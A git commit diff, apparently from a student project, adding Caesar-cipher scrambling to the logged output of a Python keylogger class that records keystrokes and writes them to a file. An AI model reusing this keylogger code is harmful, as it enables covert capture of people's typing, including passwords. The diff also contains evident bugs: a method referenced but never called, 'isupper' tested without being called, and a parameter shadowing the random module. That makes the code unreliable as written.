278146456693515cc7ac33008a18042706f8e9be
icoatesosu <coates.121@buckeyemail.osu.edu>
2021-04-03 13:39:32 -0400

    Initial caesar cipher commit

--- keylogger.py
+++ keylogger.py
@@ -2,28 +2,37 @@ import os
 import keyboard
 import sys
 import random
+import string
 
 class Keylogger:
     mode = []
     logged = ""
     rand = 10
+    caesar = 0
+    shift = 0
+
+
 
     def change_mode(self, change):
         self.mode = change
     
     def change_rand(self, random):
-        self.rand = random  
+        self.rand = random.randint(1, 26)
 
     def get_mode(self):
         return self.mode
 
     def get_rand(self):
         return self.rand
+    
+    def random_shift(self):
+        self.shift = random.randint(1, 26)
 
     # Initialize mode from command lien
     def __init__(self, mode):
         self.mode = mode
         self.rand = 10
+        self.caesar = 0
 
     # Format output string so that it isn't one long line
     def create_output_string(self):
@@ -50,8 +59,21 @@ class Keylogger:
 
     def simulated_key_pressed(self, key):
         c = key
+        if self.caesar != 0:
+            if key == " " or key in string.punctuation:
+                self.logged += key
+                self.caesar = 0
+            else:
+                c = self.caesar_cipher_encrypt(c, self.shift)
+                self.logged += c
+        elif key == " " and 1 == random.randint(1, 5):
+            self.random_shift
+            self.caesar = 1
+            self.logged += key
+        elif key == " ":
+            self.logged += key
         # Random mode, each character has a 10% chance of being a random character, rather than the one pressed
-        if self.mode == "random":
+        elif self.mode == "random":
             if random.randint(1, self.get_rand()) == 1:
                 # Creates random character from range of ascii values for standard keyboard operations
                 rand_char = chr(random.randint(32, 126))
@@ -89,6 +111,14 @@ class Keylogger:
         # Writes to file when you press "a"
         if event.name == "a":
             self.write()
+
+    def caesar_cipher_encrypt(self, char, shift):
+        if char.isupper:
+            result = chr((ord(char) + shift - 65) % 26 + 65)
+            # Encrypt lowercase characters in plain text
+        else:
+            result = chr((ord(char) + shift - 97) % 26 + 97)
+        return result
 
 # To run, navigate to directory in command line and use 'python keylogger.py [mode]'
 # [MODE OPTIONS]
